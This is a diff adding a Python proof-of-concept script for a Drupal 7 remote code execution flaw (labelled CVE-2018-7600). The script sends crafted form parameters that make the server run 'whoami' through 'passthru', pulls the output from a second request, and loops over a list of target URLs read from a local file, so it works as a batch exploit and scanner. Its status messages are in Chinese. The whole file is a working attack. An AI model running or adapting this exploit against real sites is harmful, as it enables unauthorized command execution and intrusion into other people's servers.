@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+# _*_ coding:utf-8 _*_
+# Author : Noth
+
+import re
+import requests
+from multiprocessing import Pool, Manager
+
+requests.packages.urllib3.disable_warnings()
+
+def poc(target):
+    get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': 'whoami'}
+    post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
+    try:
+        r = requests.post(target, params=get_params, data=post_params, verify=False,allow_redirects=False)
+        rule1 = re.compile(r'<input type="hidden" name="form_build_id" value="(.*?)" />')
+        form_build_id = rule1.findall(r.text)
+        if form_build_id:
+            get_params = {'q':'file/ajax/name/#value/' + form_build_id[0]}
+            post_params = {'form_build_id':form_build_id[0]}
+            r = requests.post(target, params=get_params, data=post_params, verify=False)
+            rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
+            parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
+            if parsed_result and len(parsed_result[0])>0:
+                print(("vulnerable target: "+    target+    "\n當前權限:"+    parsed_result[0]))
+                return ("vulnerable target:"+    target+    "\n當前權限:"+    parsed_result[0])
+    except:
+        pass
+try:
+    with open('/home/kali/Desktop/PoC/CVE-2018-7600-Drupal7/target2.txt') as file:
+        url_list = file.readlines()
+        for url in url_list:
+           target_url = url.strip()
+           print("測試 URL:",target_url)
+           poc(target_url)
+except FileNotFoundError:
+    print('當前路徑找不到 target.txt')
+except IOError:
+    print('文件權限錯誤,無法讀取')
